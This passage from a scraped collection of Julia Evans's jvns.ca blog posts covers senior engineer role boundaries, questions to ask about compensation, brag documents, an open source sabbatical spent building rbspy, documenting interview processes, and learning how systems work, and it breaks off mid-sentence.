\n\n What’s not part of the job \n\n This section is a bit tricky. I’m not saying that these aren’t a senior engineer’s job in the sense\nof “I won’t help create a good work environment on my team, how dare you suggest that’s part of my\njob!!“. Most senior engineers I know have spent a huge amount of time thinking about these issues\nand work on them quite a bit. \n\n The reason I think it’s useful to create a boundary here is that everyone I work with has a really\nstrong sense of ownership/responsibility to the team / company (“does it need to be done? well,\nsure, I can do that!!“) and I think it’s easy for that willingness to do whatever needs to happen to\nturn into folks getting overwhelmed/overworked/unable to make the kinds of technical contributions\nthat are actually their core job. So if you can create some boundaries around your role it’s easier\nto decide what sorts of work to ask for help with when things are hectic. The actual boundary you\ndraw course depends on you / your team :) \n\n Most of these are a manager’s job. Caveats: managers do a lot more than the things listed here (for\ninstance “create new projects”), and at some companies some of these things might actually be the\njob of a senior engineer (eg sprint management). \n\n \n Make sure every team member’s work is recognized \n Make sure work is allocated in a fair way \n Make sure folks are working well together \n Build team cohesion \n Have 1:1s with everyone on the team \n Train new managers / help them understand what’s expected of them (though I think senior ICs often\nactually do end up picking some of this up?) \n Do project management for projects you’re not working on (where I work, that’s the job of whatever\nengineer is leading that project) \n Be a product manager \n Do sprint management / organize everyone’s work into milestones / run weekly team meetings \n \n\n Explicitly setting boundaries is useful \n\n I ran into an interesting situation recently where I was talking to a manager about which things\nwere and weren’t part of my job as an engineer, and we realized that we had very different\nexpectations! We talked about it and I think it’s sorted out now, but it made me realize that it’s\nvery important to agree about what the expectations are :) \n\n When I started out as an engineer, my job was pretty straightforward – I wrote code, tried to come\nup with projects that made sense, and that was fine. My manager always had a clear sense of what my\njob was and it wasn’t too complicated. Now that’s less true! So now I view it as being more my\nresponsibility to define a job that: \n\n \n I can do / is sustainable for me \n I want to do / that’s overall enjoyable & in line with my personal goals \n is valuable to the team/organization \n \n\n And the exact shape of that job will be different for different people (not everyone has the same\ninterests & strengths, for example I am actually not amazing at code review yet!), which I think\nmakes it even more important to negotiate it / do expectation setting. \n\n Don’t agree to a job you can’t do / don’t want \n\n I think pushing back if I’m asked to do work that I can’t do or that I think will make me unhappy\nlong term is important! I find it kind of tempting to agree to take on a lot of work that I know I\ndon’t really enjoy (“oh, it’s good for the team!”, “well  someone  needs to do it!“). But, while I\nobviously sometimes take on tasks just because they need to be done, I think it’s actually really\nimportant for team health for folks to be overall doing jobs that are sustainable for them and that\nthey overall enjoy. \n\n So I’ll take on small tasks that just need to get done, but I think it’s important for me not to say\n“oh sure, I’ll spend a large fraction of my time doing this thing that I’m bad at and that I\ndislike, no problem” :). And if “someone” needs to do it, maybe that just means we need to\nhire/train someone new to fill the gap :) \n\n I still have a lot to learn! \n\n While I feel like I’m starting to understand what this “senior engineer” thing is all about (7 years\ninto my career so far), I still feel like I have a LOT to learn about it and I’d be interested to\nhear how other people define the boundaries of their job! \n\n"},
{"url": "https://jvns.ca/blog/compensation-questions/", "title": "Questions you can ask about compensation", "content": "\n     \n\n Talking about pay is hard, and a lot of the time it feels like it boils down to\n“hello I would like more money please?”. But it’s totally possible to have a\nconversation about compensation without asking for more money at all! \n\n When trying to understand (and let’s be honest – increase!) my pay, I’ve found\nit really useful to first understand the processes around compensation at the\ncompany I work for. Here are some questions you can ask. Your manager can\nprobably answer many of these, but your colleagues might know too! \n\n \n Who makes decisions about raises?  (is it at the discretion of the\nmanager? Does the manager have a fixed budget they can give out? Is there a\nformula based on past performance evaluations?) \n When do we adjust salaries?  (on the employee’s work anniversary? Right\nafter a performance review?) \n Do we do market adjustments  to give people raises if the industry salary\nfor this job increases? What’s the process for that? \n Is there a salary range for my level?  What is it approximately? (Also same question for total compensation and not just salary) \n Does the company actually stick to its salary ranges  or does it often\nmake  exceptions? What’s the process for getting paid higher than the range?\nWho can decide to make an exception? \n Which other companies are we trying to be competitive with  when we make\njob offers? \n How is compensation split between salary/equity/bonus?  (at higher\nlevels, will my pay be mostly equity? what do we aim for with bonuses?) \n Is it possible to get more vacation?  (at this company, do you get more\nvacation after X years?) \n When are equity refreshes given?  (do we give refreshes yearly? Only when\nsomeone’s initial stock grant is about to expire?) \n Who makes decisions about equity refreshes and how?  (are they based on\nlevel? Performance? Who decides?) \n When do my stock options expire?  (this one you should definitely have been told, but if your company has stock options set up like “they expire 3 months after you leave”, it’s possible for them to  change their policy ) \n Is on-call time compensated? How? \n How do bonuses work exactly?  (is it tied to company performance?\nIndividual performance? Level? All of the above? Are bonuses targeted to be\na percentage of salary?) \n Is there a peer bonus system?  (can people recommend their coworkers for\ncash bonuses?) \n Is there a learning budget?  (for conferences / books / training?) \n Is it possible to take unpaid time off? \n \n\n If you’re negotiating a job offer it can also be useful to ask about signing/relocation bonus and  details about the stock options . \n\n This is probably too many questions to ask all at once, and your manager may\nnot even know the answers to all of these questions themselves. That’s okay! I\ndefinitely didn’t know the answers to all of these at my last job, but knowing\neven some of these answers is really helpful. \n\n company policies can vary a lot \n\n The reason this blog post is “questions to ask” and not “how compensation\nworks” is that different companies have VERY different compensation policies.\nAt some companies you can ask for a raise and just get it if you make a good\ncase, and at other companies there are very strict rules about the salary bands\nfor each level. And everything in between, and then apply that to every axis of\ncompensation (salary, bonuses, equity, paid vacation, benefits). Regardless\nof what the “best” compensation policies are, it’s good to know what\nsituation you’re in exactly. \n\n And be careful of assuming you know the answers already! \n\n why this is useful \n\n If you know when and how decisions about compensation are made, it’s easier to\nfigure out where to apply pressure, either individually (by making a case for\nyourself) or through collective action (by making specific demands as a group\nfor something to be changed). \n\n"},
{"url": "https://jvns.ca/blog/brag-documents/", "title": "Get your work recognized: write a brag document", "content": "\n     \n\n There’s this idea that, if you do great work at your job, people will (or should!) automatically\nrecognize that work and reward you for it with promotions / increased pay. In practice, it’s often\nmore complicated than that – some kinds of important work are more visible/memorable than others.\nIt’s frustrating to have done something really important and later realize that you didn’t get\nrewarded for it just because the people making the decision didn’t understand or remember what you\ndid. So I want to talk about a tactic that I and lots of people I work with have used! \n\n This blog post isn’t just about being promoted or getting raises though. The ideas here have\nactually been more useful to me to help me reflect on themes in my work, what’s important to me,\nwhat I’m learning, and what I’d like to be doing differently. But they’ve definitely helped with\npromotions! \n\n You can also  skip to the brag document template at the end . \n\n you don’t remember everything you did \n\n One thing I’m always struck by when it comes to performance review time is a feeling of “wait, what\n did  I do in the last 6 months?“. This is a kind of demoralizing feeling and it’s usually not based\nin reality, more in “I forgot what cool stuff I actually did”. \n\n I invariably end up having to spend a bunch of time looking through my pull requests, tickets,\nlaunch emails, design documents, and more. I always end up finding small (and sometimes\nnot-so-small) things that I completely forgot  I did, like: \n\n \n mentored an intern 5 months ago \n did a small-but-important security project \n spent a few weeks helping get an important migration over the line \n helped X put together this design doc \n etcetera! \n \n\n your manager doesn’t remember everything you did \n\n And if you don’t remember everything important you did, your manager (no matter how great they are!)\nprobably doesn’t either. And they need to explain to other people why you should be promoted or\ngiven an evaluation like “exceeds expectations” (“X’s work is so awesome!!!!” doesn’t fly). \n\n So if your manager is going to effectively advocate for you, they need help. \n\n here’s the tactic: write a document listing your accomplishments \n\n The tactic is pretty simple! Instead of trying to remember everything you did with your brain,\nmaintain a “brag document” that lists everything so you can refer to it when you get to performance\nreview season! This is a pretty common tactic – when I started doing this I mentioned it to more\nexperienced people and they were like “oh yeah, I’ve been doing that for a long time, it really\nhelps”. \n\n Where I work we call this a “brag document” but I’ve heard other names for the same concept like\n“hype document” or “list of stuff I did” :). \n\n There’s a basic template for a brag document at the end of this post. \n\n share your brag document with your manager \n\n When I first wrote a brag document I was kind of nervous about sharing it with my manager. It felt\nweird to be like “hey, uh, look at all the awesome stuff I did this year, I wrote a long document\nlisting everything”. But my manager was really thankful for it – I think his perspective was “this\nmakes my job way easier, now I can look at the document when writing your perf review instead of\ntrying to remember what happened”. \n\n Giving them a document that explains your accomplishments will really help your manager advocate for\nyou in discussions about your performance and come to any meetings they need to have prepared. \n\n Brag documents also  really  help with manager transitions – if you get a new manager 3 months\nbefore an important performance review that you want to do well on, giving them a brag document\noutlining your most important work & its impact will help them understand what you’ve been doing\neven though they may not have been aware of any of your work before. \n\n share it with your peer reviewers \n\n Similarly, if your company does peer feedback as part of the promotion/perf process  – share your\nbrag document with your peer reviewers!! Every time someone shares their doc with me I find it SO\nHELPFUL with writing their review for much the same reasons it’s helpful to share it with your\nmanager – it reminds me of all the amazing things they did, and when they list their goals in their\nbrag document it also helps me see what areas they might be most interested in feedback on. \n\n On some teams at work it’s a team norm to share a brag document with peer reviewers to make it\neasier for them. \n\n explain the big picture \n\n In addition to just listing accomplishments, in your brag document you can write the narrative explaining the big picture of your work. Have you been really focused on security? On building your product skills & having really good relationships with your users? On building a strong culture of code review on the team? \n\n In my brag document, I like to do this by making a section for areas that I’ve been focused on (like “security”) and listing all the work I’ve done in that area there. This is especially good if you’re working on something fuzzy like “building a stronger culture of code review” where all the individual actions you do towards that might be relatively small and there isn’t a big shiny ship. \n\n use your brag document to notice patterns \n\n In the past I’ve found the brag document useful not just to hype my accomplishments, but also to reflect on the work I’ve done. Some questions it’s helped me with: \n\n \n What work do I feel most proud of? \n Are there themes in these projects I should be thinking about? What’s the big picture of what I’m working on?  (am I working a lot on security? localization?). \n What do I wish I was doing more / less of? \n Which of my projects had the effect I wanted, and which didn’t? Why might that have been? \n What could have gone better with project X? What might I want to do differently next time? \n \n\n you can write it all at once or update it every 2 weeks \n\n Many people have told me that it works best for them if they take a few minutes to update their brag document every 2 weeks ago. For me it actually works better to do a single marathon session every 6 months or every year where I look through everything I did and reflect on it all at once. Try out different approaches and see what works for you! \n\n don’t forget to include the fuzzy work \n\n A lot of us work on fuzzy projects that can feel hard to quantify, like: \n\n \n improving code quality on the team / making code reviews a little more in depth \n making on call easier \n building a more fair interview process / performance review system \n refactoring / driving down technical debt \n \n\n A lot of people will leave this kind of work out because they don’t know how to explain why it’s important. But I think this kind of work is especially important to put into your brag document because it’s the most likely to fall under the radar! One way to approach this is to, for each goal: \n\n \n explain your goal for the work (why do you think it’s important to refactor X piece of code?) \n list some things you’ve done towards that goal \n list any effects you’ve seen of the work, even if they’re a little indirect \n \n\n If you tell your coworkers this kind of work is important to you and tell them what you’ve been\ndoing, maybe they can also give you ideas about how to do it more effectively or make the effects of\nthat work more obvious! \n\n encourage each other to celebrate accomplishments \n\n One nice side effect of having a shared idea that it’s normal/good to maintain a brag document at\nwork is that I sometimes see people encouraging each other to record & celebrate their\naccomplishments (“hey, you should put that in your brag doc, that was really good!”). It can be hard\nto see the value of your work sometimes, especially when you’re working on something hard, and an\noutside perspective from a friend or colleague can really help you see why what you’re doing is\nimportant. \n\n Brag documents are good when you use them on your own to advocate for yourself, but I think they’re\nbetter as a collaborative effort to recognize where people are excelling. \n\n Next, I want to talk about a couple of structures that we’ve used to help people recognize their accomplishments. \n\n the brag workshop: help people list their accomplishments \n\n The way this “brag document” practice started in the first place is that my coworker  Karla  and I wanted to help other women in engineering advocate for themselves more in the performance review process. The idea is that some people undersell their accomplishments more than they should, so we wanted to encourage those people to “brag” a little bit and write down what they did that was important. \n\n We did this by running a “brag workshop” just before performance review season. The format of the workshop is like this: \n\n Part 1: write the document: 1-2 hours . Everybody sits down with their laptop, starts looking\nthrough their pull requests, tickets they resolved, design docs, etc, and puts together a list of\nimportant things they did in the last 6 months. \n\n Part 2: pair up and make the impact of your work clearer: 1 hour . The goal of this part is to\npair up, review each other’s documents, and identify places where people haven’t bragged “enough” –\nmaybe they worked on an extremely critical project to the company but didn’t highlight how important\nit was, maybe they improved test performance but didn’t say that they made the tests 3 times faster\nand that it improved everyone’s developer experience. It’s easy to accidentally write “I shipped\n$feature” and miss the follow up (“… which caused $thing to happen”). Another person reading\nthrough your document can help you catch the places where you need to clarify the impact. \n\n biweekly brag document writing session \n\n Another approach to helping people remember their accomplishments: my friend Dave gets some friends\ntogether every couple of weeks or so for everyone to update their brag documents. It’s a nice way\nfor people to talk about work that they’re happy about & celebrate it a little bit, and updating\nyour brag document as you go can be easier than trying to remember everything you did all at once at\nthe end of the year. \n\n These don’t have to be people in the same company or even in the same city – that group meets over\nvideo chat and has people from many different companies doing this together from Portland, Toronto,\nNew York, and Montreal. \n\n In general, especially if you’re someone who really cares about your work, I think it’s really\npositive to share your goals & accomplishments (and the things that haven’t gone so well too!) with\nyour friends and coworkers. It makes it feel less like you’re working alone and more like\neveryone is supporting each other in helping them accomplish what they want. \n\n thanks \n\n Thanks to Karla Burnett who I worked with on spreading this idea at work, to Dave Vasilevsky for\nrunning brag doc writing sessions, to Will Larson who encouraged me to start one  of these  in the\nfirst place, to my manager Jay Shirley for always being encouraging & showing me that this is a\nuseful way to work with a manager, and to Allie, Dan, Laura, Julian, Kamal, Stanley, and Vaibhav for\nreading a draft of this. \n\n I’d also recommend the blog post  Hype Yourself! You’re Worth It!  by Aashni Shah which talks about a similar approach. \n\n Appendix: brag document template \n\n Here’s a template for a brag document! Usually I make one brag document per year. (“Julia’s\n2017 brag document”). I think it’s okay to make it quite long / comprehensive – 5-10 pages or more\nfor a year of work doesn’t seem like too much to me, especially if you’re including some\ngraphs/charts / screenshots to show the effects of what you did. \n\n One thing I want to emphasize, for people who don’t like to brag, is –  you don’t have to try to\nmake your work sound better than it is . Just make it sound  exactly as good as it is ! For\nexample “was the primary contributor to X new feature that’s now used by 60% of our customers and\nhas gotten Y positive feedback”. \n\n Goals for this year: \n\n \n List your major goals here! Sharing your goals with your manager & coworkers is really nice because it helps them see how they can support you in accomplishing those goals! \n \n\n Goals for next year \n\n \n If it’s getting towards the end of the year, maybe start writing down what you think your goals for next year might be. \n \n\n Projects \n\n For each one, go through: \n\n \n What your contributions were (did you come up with the design? Which components did you build? Was there some useful insight like “wait, we can cut scope and do what we want by doing way less work” that you came up with?) \n The impact of the project – who was it for? Are there numbers you can attach to it? (saved X dollars? shipped new feature that has helped sell Y big deals? Improved performance by X%? Used by X internal users every day?). Did it support some important non-numeric company goal (required to pass an audit? helped retain an important user?) \n \n\n Remember: don’t forget to explain what the results of you work actually were! It’s often important to go back a few months later and fill in what actually happened after you launched the project. \n\n Collaboration & mentorship \n\n Examples of things in this category: \n\n \n Helping others in an area you’re an expert in (like “other engineers regularly ask me for one-off help\nsolving weird bugs in their CSS” or “quoting from the C standard at just the right moment”) \n Mentoring interns / helping new team members get started \n Writing really clear emails/meeting notes \n Foundational code that other people built on top of \n Improving monitoring / dashboards / on call \n Any code review that you spent a particularly long time on / that you think was especially important \n Important questions you answered (“helped Risha from OTHER_TEAM with a lot of questions related to Y”) \n Mentoring someone on a project (“gave Ben advice from time to time on leading his first big project”) \n Giving an internal talk or workshop \n \n\n Design & documentation \n\n List design docs & documentation that you worked on \n\n \n Design docs: I usually just say “wrote design for X” or “reviewed design for X” \n Documentation: maybe briefly explain the goal behind this documentation (for example “we were getting a lot of questions about X, so I documented it and now we can answer the questions more quickly”) \n \n\n Company building \n\n This is a category we have at work – it basically means “things you did to help the company overall, not just your project / team”. Some things that go in here: \n\n \n Going above & beyond with interviewing or recruiting (doing campus recruiting, etc) \n Improving important processes, like the interview process or writing better onboarding materials \n \n\n What you learned \n\n My friend Julian suggested this section and I think it’s a great idea – try listing important\nthings you learned or skills you’ve acquired recently! Some examples of skills you might be\nlearning or improving: \n\n \n how to do performance analysis & make code run faster \n internals of an important piece of software (like the JVM or Postgres or Linux) \n how to use a library (like React) \n how to use an important tool (like the command line or Firefox dev tools) \n about a specific area of programming (like localization or timezones) \n an area like product management / UX design \n how to write a clear design doc \n a new programming language \n \n\n It’s really easy to lose track of what skills you’re learning, and usually when I reflect on this I\nrealize I learned a lot more than I thought and also notice things that I’m  not  learning that I\nwish I was. \n\n Outside of work \n\n It’s also often useful to track accomplishments outside of work, like: \n\n \n blog posts \n talks/panels \n open source work \n Industry recognition \n \n\n I think this can be a nice way to highlight how you’re thinking about your career outside of strictly what you’re doing at work. \n\n This can also include other non-career-related things you’re proud of, if that feels good to you! Some people like to keep a combined personal + work brag document. \n\n General prompts \n\n If you’re feeling stuck for things to mention, try: \n\n \n If you were trying to convince a friend to come join your company/team, what would you tell them about your work? \n Did anybody tell you that you did something well recently? \n \n\n"},
{"url": "https://jvns.ca/blog/2018/03/28/open-source-sabbatical---awesome/", "title": "Open source sabbatical = awesome", "content": "\n     \n\n Hello! This is my last week working on rbspy. I’m planning to write more about the profiler and how\nit works soon, but I wanted to take a minute to talk (again) about how I ended up working on the\nproject and how it’s funded. I want to talk about funding because it’s an important part of how a\nlot of open source software gets created and maintained! \n\n Just about a year ago today (March 23, 2017) Segment announced their  Open Fellowship  – funding for 3 months to work\non an open source project. \n\n The blog post said: \n\n \n The primary goal of the fellowship is to enable participants to fully dedicate themselves to a project for a few months. We’re hoping to give them a chance to speed the adoption of a new, fast-growing project. Or maybe help them build some long-awaited key features of a library that’s already widely used. Or perhaps even jump-start an entirely new idea altogether. \n \n\n When I saw this, my thought process went: \n\n \n That sounds amazing!! I want to do that! \n But what would I work on? Oh, I have this Ruby profiler prototype I built last year, maybe that??\nThat would be fun and I think it might help a lot of people! \n I’ll apply and see what happens! \n \n\n So I filled in the form, thinking “who knows if they’ll accept me? I’ll just apply and\nsee what happens!! If you’re not getting rejections you’re not being ambitious enough, julia!” and waited.\nThey accepted my application, and the project happened!! \n\n open source funding models \n\n Before I talk about what made this fellowship + sabbatical work for me, I wanted to take a second to\ncatalog a few open source software funding models that I’m aware of: \n\n \n a company employs people who work on the software (like Hashicorp or Google or Mozilla or  Igalia ) \n companies who use the software donate to a software foundation (like the Linux foundation or\n Ruby Together ) that pay developers to work on the project \n Crowdfunding with Patreon (successfully used by the  vue.js project ) \n Google Summer of Code  /\n Outreachy  pay a ~$5000 stipend to students / folks from\nunderrepresented groups to work on an open source project for 3 months. Participants get a mentor. \n Segment Open Fellowship / Stripe Open Source Retreat (pay someone to do 3 months of work on an\nopen source project they choose) \n \n\n There are certainly more that I’m leaving out – see  A handy guide to financial support for open source  and  getting paid for open source work  for more! \n\n One difference is that some models involve full-time employment and some models are about sponsoring\nsprints of activity on a project. In this case, the “sprints of activity” model worked really well\nfor me. \n\n flexible starting time: very helpful \n\n Originally, the fellowship was supposed to run from June 15 to September 15, 2017. Obviously I\ndidn’t do it from June to September, because it’s March now! So here’s what happened. Segment offered me\nthe fellowship (yay!). I realized I couldn’t take time off work by June 15, and told them so. They\nextremely kindly said I could delay the fellowship until a later time that worked for me. I\nsuggested January -> March 2018 (6 months later) and they agreed to it! \n\n Then I asked my manager if I could take 3 months off work from January-March (unpaid) to do the fellowship.\nSince there was about 6 months notice (lots of time), we got permission to do it. Amazing! \n\n I think it was  amazing  that Segment was so flexible about the dates of the fellowship – their\nflexibility (and Stripe’s willingness to let me take 3 months off work) was what made it possible\nfor me to do this. Otherwise I probably won’t have done this project. \n\n Giving my team a lot of notice was great – I was responsible for a  pretty big project \nat the time, so putting the sabbatical 6 months into the future gave me lots of time to make a lot\nof progress on the project and help get other people on the team up to speed so they could take over\nwhile I was away. \n\n doing the fellowship remotely \n\n The other thing that Segment did that I thought was amazing was – they said it was totally fine if\nfellowship participants did their projects remotely! This was important to me (I wouldn’t have\napplied otherwise) because, realistically, I wasn’t going to move to San Francisco for 3 months to\ndo this project. \n\n I blogged about my progress on and off as I went, which I think helped them feel like they knew what\nwas going on even though I wasn’t in their office. They didn’t ask that I do that, though – they\nwere just supportive of me working in whatever way I chose to work. \n\n Working from home is how I work usually so this felt pretty normal. \n\n sabbaticals are cool \n\n I really like my job, and I didn’t want to quit just to be able to dedicate some time to a project\nthat I was interested in. So I think it’s awesome that I was able to take time off work to do the\nproject. I’ve been at Stripe for 4 years, so Stripe’s sabbatical policy said that I was allowed to\ntake a 3-month unpaid break and come back after. \n\n Working on a smallish (~4000 LOC) open source project has been a nice thing to do for a relatively\nshort/focused amount of time. I don’t think rbspy needs more full-time dedicated attention right now\n(it works! time to step back, see what people think of it, and fix bugs / add features as they’re\nneeded), so I’m happy to go back to a job & team that I like. \n\n Another benefit of doing this was that now I have actual code that I’ve written out in the open on\nGitHub! I don’t really believe in “github is your resume” (lots of great programmers don’t do any\nopen source work! that’s fine!) but it does feel good to have. \n\n build a prototype to build confidence \n\n Taking time off work to build a programming project felt a little risky.  What if my ideas didn’t\nwork? I think the biggest thing that helped me be confident in my ability to do the project was – I\nhad a prototype!! In May 2016\n( blog post: “How to spy on a Ruby program” ), I’d\nwritten a small prototype of what eventually became rbspy. \n\n That prototype wasn’t really something people could  use  – it was pretty fragile and, while a\nfew people had used it and contributed to it, it needed a lot of work. But it did  kind of  work,\nand so I felt pretty confident that I could make it into something more robust if I just spent time\non it.  (spoiler: I was right! it’s way more robust now! people are able to use it!) \n\n I don’t do programming projects after work \n\n Some people program after work. I think this is cool, but I don’t! I don’t really feel like I have\nthe energy to do it. For whatever reason I  do  have the energy to write hundreds of blog posts\nabout programming, but I guess that comes out of a different energy reserve for me :). \n\n I’ve done exactly 3 side programming projects in the last 4 years, none of them particularly time\nconsuming ( turn off retweets ,  computers are fast , the rbspy prototype). \n\n It’s been useful for me to accept that I don’t really want to program after work or on the weekends.\nBut of course there  are  projects I’m excited about building, so this sabbatical was a great\nopportunity to do programming work that I wouldn’t otherwise do. \n\n apply to things, even if you’re not sure how they’ll work out \n\n One lesson I learned from this was –  apply to things ! I did a couple of things “wrong” when\napplying to this fellowship: \n\n \n The application asked for a resume and I didn’t have an up-to-date one, so I just filled in the\n“resume” section with a link to my blog (since this blog lists a lot of the work that I’ve done) \n More importantly – when I applied, I didn’t know whether I’d be able to actually accept the\nfellowship if they offered it to me. It was short notice (I applied in April for a\nfellowship starting in June), and I didn’t have a plan yet for how I’d take time off work. \n \n\n But I applied anyway, and then when they offered me the fellowship and the dates didn’t work for me\nI told them that I couldn’t do it (I actually said “sorry, I actually can’t do those dates, please\noffer the fellowship to somebody else!“), and they offered to change things around to make it work!\nSo I asked for it to be delayed by 6 months (which at the time felt like a big thing to ask for),\nand they agreed! \n\n It actually took me quite a while to work out the details – they told me I was accepted in June,\nand I only got permission from work to take time off finalized about a month later. But that was\nokay! They were very patient and it worked out :) \n\n So I think it was a great idea to apply with no clear plan of how I’d handle it if they accepted me,\nbecause we figured it out and it was fine! \n\n maybe take a sabbatical! \n\n It looks like Segment might be doing the same fellowship program again this year. If you’re\ninterested in getting email when they open applications, the  open fellowship homepage \nhas a mailing list. \n\n For me taking this sabbatical has been great – it’s really fun to have an focused goal that’s\noutside of my usual comfort zone. “Ship a cross-platform binary”, “do a medium-sized systems\nprogramming project that people actually use”, “build a profiler”, and “lead an open source project”\nare all things I was interested in but had never done before, and the end product is something that\npeople are using and that I’m happy with! \n\n"},
{"url": "https://jvns.ca/blog/2020/06/30/tell-candidates-what-to-expect-from-your-job-interviews/", "title": "Tell candidates what to expect from your job interviews", "content": "\n     \n\n In my last job, I helped with a few projects (like  brag\ndocuments  and the engineering levels) to\nhelp make the engineering culture a little more inclusive, and I want to talk\nabout one of them today: making the interview process a little easier to\nunderstand for candidates. \n\n I worked on this project for a few days way back in 2015 and I’m pretty happy\nwith how it turned out. \n\n giving everyone a little information helps level the playing field \n\n Different tech companies run their interviews in very different ways, and I\nthink it’s silly to expect candidates to magically intuit how your company’s\ninterview process works. \n\n It sucks for everyone when a candidate is surprised with an unexpected\ninterview. For example, at the time the debugging interview required candidates\nto have a dev environment set up on their computer that let them install a\nlibrary & run the tests. Sometimes candidates didn’t have their environment set\nup the right way, which was a waste of everyone’s time! The point of the\ninterview wasn’t to watch people install bundler! \n\n different companies have different rubrics \n\n Also, different companies actually test different things in their interviews!\nAt that job we didn’t care if people used Stack Overflow during their\ninterviews and didn’t interview for algorithms expertise, but lots of companies\n do  interview for algorithms expertise. \n\n Telling people in advance what they’ll be measured on makes it way easier for\nthem to prepare: if you tell them they won’t be asked algorithms questions,\nthey don’t have to waste their time practicing implementing breadth first\nsearch or whatever. \n\n solution: write a short document! \n\n My awesome coworker  Kiran  had a simple idea to\nhelp solve this problem: write a document explaining what to expect from the\ninterview process! She wrote the document and I helped edit it a bit. \n\n We called it  On-site interviews for Engineering: What to expect  (that link is\nto an old revision of that document I found in the internet archive). \n\n It covered: \n\n \n how to prepare for the interview \n what candidates were evaluated on (debugging! navigating codebases! communication!) \n a few things about the non-technical parts of the onsite interview \n \n\n keep it updated over time \n\n That document was originally written in April 2015. A lot of things changed\nabout the interview process over time, and so it needed to be kept updated. \n\n I think the work of keeping the document updated is even more important than\nwriting it in the first place, and a lot of amazing people worked on that. I\ndon’t work there anymore, but some quick Googling turned up what I think is the\n current version of that document ,\nand it’s great! \n\n documenting your interview process is pretty easy \n\n In my experience, advocating for changes to an interview process is really\nhard. You need to propose a new interview process, test the interviews,\nconvince interviewers to get on board – it takes a long time. \n\n In comparison, documenting an existing interview process (without changing\nit!!) is WAY EASIER. My memory is a pretty fuzzy, but I think basically nobody\nobjected to documenting the interview process the company already had – it was\njust factual information about what we were already doing! Way less\ncontroversial. \n\n you can make small changes to your company’s culture \n\n Making the companies I work at a better place for everyone to work is important\nto me. It’s a huge project, and I’ve tried a lot of things that haven’t worked. \n\n But I’ve found it rewarding to work on changes like this that make one small\nthing a little better for people. \n\n thanks to Kiran Bhattaram for coming up with this idea in the first\nplace and for reviewing a draft of this post, and to  @jilljubs  for reminding me of earlier today  \n\n"},
{"url": "https://jvns.ca/blog/learn-how-things-work/", "title": "Get better at programming by learning how things work", "content": "\n     \n\n When we talk about getting better at programming, we often talk about testing,\nwriting reusable code, design patterns, and readability. \n\n All of those things are important. But in this blog post, I want to talk about\na different way to get better at programming: learning how the systems you’re\nusing work! This is the main way I approach getting better at programming. \n\n examples of “how things work” \n\n To explain what I mean by “how things work”, here are some different types of\nprogramming and examples of what you could learn about how they work. \n\n Frontend JS: \n\n \n how the event loop works \n HTTP methods like GET and POST \n what the DOM is and what you can do with it \n the same-origin policy and CORS \n \n\n CSS: \n\n \n how inline elements are rendered differently from block elements \n what the “default flow” is \n how flexbox works \n how CSS decides which selector to apply to which element (the “cascading”\npart of the cascading style sheets) \n \n\n Systems programming: \n\n \n the difference between the stack and the heap \n how virtual memory works \n how numbers are represented in binary \n what a symbol table is \n how code from external libraries gets loaded (e.g. dynamic/static linking) \n Atomic instructions and how they’re different from mutexes \n \n\n you can use something without understanding how it works (and that can be ok!) \n\n We work with a LOT of different systems, and it’s unreasonable to expect that\nevery single person understands everything about all of them. For example, many\npeople write programs that send email, and most of those people probably don’t\nunderstand everything about how email works. Email is really complicated!\nThat’s why we have abstractions. \n\n But if you’re working with something (like CSS, or HTTP, or goroutines, or\nemail) more seriously and you don’t really understand how it works, sometimes\nyou’ll start to run into problems. \n\n your bugs will tell you when you need to improve your mental model \n\n When I’m programming and I’m missing a key concept about how something works,\nit doesn’t always show up in an obvious way. What will happen is: \n\n \n I’ll have bugs in my programs because of an incorrect mental model \n I’ll struggle to fix those bugs quickly and I won’t be able to find the right questions to ask to diagnose them \n I feel really frustrated \n \n\n I think it’s actually an important skill  just to be able to recognize that\nthis is happening : I’ve slowly learned to recognize the feeling of “wait, I’m\nreally confused, I think there’s something I don’t understand about how this\nsystem works, what is it?” \n\n Being a senior developer is less about knowing absolutely everything and more\nabout quickly being able to recognize when you  don’t  know something and\nlearn it. Speaking of being a senior developer… \n\n even senior developers need to learn how their systems work \n\n So far I’ve never stopped learning how things work, because there are so many\ndifferent types of systems we work with! \n\n For example, I know a lot of the fundamentals of how C programs work and web\nprogramming (like the examples at the top of this post), but when it comes to\ngraphics programming/OpenGL/GPUs, I know very few of the fundamental ideas. And\nsometimes I’ll discover a new fact that I’m missing about a system I thought I\nknew, like last year I  discovered  that I was\nmissing a LOT of information about how CSS works. \n\n It can feel bad to realise that you really don’t understand how a system you’ve\nbeen using works when you have 10 years of experience (“ugh, shouldn’t I know\nthis already? I’ve been using this for so long!“), but it’s normal! There’s a\nlot to know about computers and we are constantly inventing new things to know,\nso nobody can keep up with every single thing. \n\n how I go from “I’m confused” to “ok, I get it!” \n\n When I notice I’m confused, I like to approach it like this: \n\n \n Notice I’m confused about a topic (“hey, when I write  await  in my\nJavascript program, what is actually happening?“) \n Break down my confusion into specific factual questions, like “when there’s\nan  await  and it’s waiting, how does it decide which part of my code runs\nnext? Where is that information stored?” \n Find out the answers to those questions (by writing a program, reading\nsomething on the internet, or asking someone) \n Test my understanding by writing a program (“hey, that’s why I was having\nthat async bug! And I can fix it like this!“) \n \n\n The last “test my understanding” step is really important. The whole point of\nunderstanding how computers work is to actually write code to make them do\nthings! \n\n I find that if I can use my newfound understanding to do something concrete\nlike implement a new feature or fix a bug or even just write a test program\nthat demonstrates how the thing works, it feels a LOT more real than if I just\nread about it. And then it’s much more likely that I’ll be able to use it in\npractice later. \n\n just learning a few facts can help a lot \n\n Learning how things work doesn’t need to be a big huge thing. For example, I\nused to not really know how floating point numbers worked, and I felt nervous\nthat something weird would happen that I didn’t understand. \n\n And then one day in 2013 I went to a talk by Stefan Karpinski explaining how\nfloating point numbers worked (containing roughly the information in  this comic , but with more weird\ndetails). And now I feel totally confident using floating point numbers! I know\nwhat their basic limitations are, and when not to use them (to represent\nintegers larger than 2^53). And I know what I  don’t  know – I know it’s hard\nto write numerically stable linear algebra algorithms and I have no idea how to\ndo that. \n\n connect new facts to information you already know \n\n When learning a new fact, it’s easy to be able to recite a sentence like “ok,\nthere are 8 bits in a byte”. That’s true, but so what? What’s harder (and much\nmore useful!) is to be able to connect that information to what you already\nknow about programming. \n\n For example, let’s take this “8 bits in a byte thing”. In your program you\nprobably have strings, like “Hello”. You can already start asking lots of\nquestions about this, like: \n\n \n How many bytes in memory are used to represent the string “Hello”? (it’s 6 – 5 characters plus a null byte at the end) \n What bits exactly does the letter “H” correspond to? (the encoding for\n“Hello” is going to be using ASCII, so you can look it up in an ASCII table!) \n If you have a running program that’s printing out the string 